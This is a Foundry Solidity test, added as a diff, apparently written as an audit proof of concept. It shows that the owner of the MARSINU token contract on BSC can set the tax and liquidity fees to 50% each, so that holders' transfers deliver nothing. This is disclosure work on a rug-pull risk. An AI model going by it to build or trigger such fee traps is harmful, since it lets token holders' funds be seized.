@@ -1,0 +1,67 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the MARSINU contract
+interface IMARSINU {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setTaxFeePercent(uint256 taxFee) external;
+    function setLiquidityFeePercent(uint256 liquidityFee) external;
+    function isExcludedFromFee(address account) external view returns (bool);
+    function totalSupply() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    // Target contract address on BSC
+    address constant MARSINU = 0xfbbcb4bcaf3033a51e4a2ad1d904927ca0edbde7;
+    IMARSINU public marsinu;
+
+    address public owner;
+    address public user = address(0x123);
+    address public recipient = address(0x456);
+
+    function setUp() public {
+        marsinu = IMARSINU(MARSINU);
+        owner = marsinu.owner();
+
+        vm.label(MARSINU, "MARSINU");
+        vm.label(owner, "Owner");
+        vm.label(user, "User");
+        vm.label(recipient, "Recipient");
+    }
+
+    function test_DeployerCanLockUserFunds() public {
+        // 1. Ensure user has tokens – owner transfers some to user (owner is excluded from fees)
+        uint256 amount = 1000 * 10**9; // 1000 tokens (9 decimals)
+        vm.prank(owner);
+        marsinu.transfer(user, amount);
+        assertEq(marsinu.balanceOf(user), amount, "User should have received tokens from owner");
+
+        // 2. Owner sets both fees to 50% each (total 100%)
+        vm.prank(owner);
+        marsinu.setTaxFeePercent(50);
+        vm.prank(owner);
+        marsinu.setLiquidityFeePercent(50);
+
+        // 3. User attempts to transfer 100 tokens to recipient
+        uint256 userBalanceBefore = marsinu.balanceOf(user);
+        uint256 recipientBalanceBefore = marsinu.balanceOf(recipient);
+        uint256 transferAmount = 100 * 10**9;
+
+        vm.prank(user);
+        marsinu.transfer(recipient, transferAmount);
+
+        uint256 userBalanceAfter = marsinu.balanceOf(user);
+        uint256 recipientBalanceAfter = marsinu.balanceOf(recipient);
+
+        // 4. Assertions: recipient got nothing, user lost the full transfer amount (fees consume everything)
+        assertEq(recipientBalanceAfter, recipientBalanceBefore, "Recipient balance should not increase");
+        assertEq(userBalanceAfter, userBalanceBefore - transferAmount, "Sender loses full amount to fees");
+        // Additionally, user cannot transfer any meaningful amount because tTransferAmount = 0
+    }
+}
+```
